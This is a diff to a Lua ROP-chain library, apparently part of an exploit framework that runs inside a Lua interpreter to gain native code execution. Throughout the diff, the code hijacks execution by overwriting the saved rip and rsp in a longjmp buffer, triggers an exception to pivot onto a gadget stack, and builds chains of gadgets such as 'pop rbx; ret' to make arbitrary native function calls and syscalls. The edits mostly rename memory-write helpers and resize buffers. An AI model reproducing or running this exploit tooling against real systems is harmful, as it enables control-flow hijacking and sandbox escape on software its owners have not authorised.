@@ -21,19 +21,17 @@ function ropchain:new(opt)
     local self = setmetatable({}, ropchain)
 
     if not ropchain.dont_recurse then
-        self.fcall_stub = ropchain.create_fcall_stub(0x2000)
+        self.fcall_stub = ropchain.create_fcall_stub(opt.fcall_stub_padding_size or 0x2000)
     end
 
     self.stack_size = opt.stack_size or 0x2000
     self.stack_base = opt.stack_base and uint64(opt.stack_base) or memory.alloc(self.stack_size)
     self.align_offset = 0
     self.stack_offset = 0
-    
-    -- assume that first stack slot is consumed by longjmp
-    if not opt.start_from_base then
-        self.stack_offset = 8
-    end
 
+    -- longjmp overwrites first stack slot with addr to ret gadget
+    self.push_ret(self)
+    
     -- align stack base to 16 bytes
     if self.stack_base:tonumber() % 16 ~= 0 then
         local jmp_to = align_16(self.stack_base + self.stack_offset) + 0x20
@@ -46,7 +44,7 @@ function ropchain:new(opt)
 
     -- recover from call [rax+8] instruction
     self.recover_from_call = memory.alloc(0x10)
-    lua.write_qword(self.recover_from_call+8, gadgets["pop rbx; ret"])
+    memory.write_qword(self.recover_from_call+8, gadgets["pop rbx; ret"])
 
     return self
 end
@@ -59,11 +57,11 @@ function ropchain.create_fcall_stub(padding_size)
     ropchain.dont_recurse = true
     local stub = ropchain({
         stack_base = fcall_stub.fn_addr,
-        start_from_base = true
     })
     ropchain.dont_recurse = false
 
     stub:push(0) -- fn addr
+    fcall_stub.fn_addr = stub:get_rsp() - 0x8
 
     -- jmp back to ropchain
     stub:push_set_rsp(0)
@@ -155,7 +153,7 @@ function ropchain:push(v)
     if self.enable_mock_push then
         self:increment_stack()
     else
-        lua.write_qword(self:increment_stack(), ropchain.resolve_value(v))
+        memory.write_qword(self:increment_stack(), ropchain.resolve_value(v))
     end
 end
 
@@ -511,7 +509,7 @@ function ropchain:gen_loop(value_address, op, compare_address, callback)
     -- } while (memory[value_address] <op> memory[compare_address])
     local jump_table = self:create_branch(value_address, op, compare_address)
 
-    lua.write_multiple_qwords(jump_table, {
+    memory.write_multiple_qwords(jump_table, {
         self:get_rsp(), -- comparison false
         target_loop, -- comparison true
     })
@@ -523,7 +521,7 @@ function ropchain:restore_through_longjmp(jmpbuf)
         return
     end
 
-    self.jmpbuf = jmpbuf or memory.alloc(0x100)
+    self.jmpbuf = jmpbuf or memory.alloc(0x60)
 
     -- restore execution through longjmp
     self:push_fcall(libc_addrofs.longjmp, self.jmpbuf, 0)
@@ -538,11 +536,11 @@ function ropchain:execute_through_coroutine()
 
         -- backup original jmpbuf
         local jmpbuf_addr = memory.read_qword(lua_state_addr+0xa8) + 0x8
-        lua.memcpy(self.jmpbuf, jmpbuf_addr, 0x100)
+        memory.memcpy(self.jmpbuf, jmpbuf_addr, 0x60)
 
         -- overwrite registers in jmpbuf
-        lua.write_qword(jmpbuf_addr + 0, gadgets["ret"])    -- rip
-        lua.write_qword(jmpbuf_addr + 16, self.stack_base)  -- rsp
+        memory.write_qword(jmpbuf_addr + 0, gadgets["ret"])    -- rip
+        memory.write_qword(jmpbuf_addr + 16, self.stack_base)  -- rsp
 
         assert(false) -- trigger exception
     end
@@ -623,14 +621,14 @@ function fcall:__call(rdi, rsi, rdx, rcx, r8, r9)
         return native.fcall_with_rax(self.fn_addr, self.syscall_no, rdi, rsi, rdx, rcx, r8, r9)
     else
         local arg_addr = fcall.arg_addr
-        lua.write_qword(arg_addr.fn_addr, self.fn_addr)
-        lua.write_qword(arg_addr.syscall_no, self.syscall_no or 0)
-        lua.write_qword(arg_addr.rdi, ropchain.resolve_value(rdi or 0))
-        lua.write_qword(arg_addr.rsi, ropchain.resolve_value(rsi or 0))
-        lua.write_qword(arg_addr.rdx, ropchain.resolve_value(rdx or 0))
-        lua.write_qword(arg_addr.rcx, ropchain.resolve_value(rcx or 0))
-        lua.write_qword(arg_addr.r8, ropchain.resolve_value(r8 or 0))
-        lua.write_qword(arg_addr.r9, ropchain.resolve_value(r9 or 0))
+        memory.write_qword(arg_addr.fn_addr, self.fn_addr)
+        memory.write_qword(arg_addr.syscall_no, self.syscall_no or 0)
+        memory.write_qword(arg_addr.rdi, ropchain.resolve_value(rdi or 0))
+        memory.write_qword(arg_addr.rsi, ropchain.resolve_value(rsi or 0))
+        memory.write_qword(arg_addr.rdx, ropchain.resolve_value(rdx or 0))
+        memory.write_qword(arg_addr.rcx, ropchain.resolve_value(rcx or 0))
+        memory.write_qword(arg_addr.r8, ropchain.resolve_value(r8 or 0))
+        memory.write_qword(arg_addr.r9, ropchain.resolve_value(r9 or 0))
         return fcall.chain:execute_through_coroutine()
     end
 end
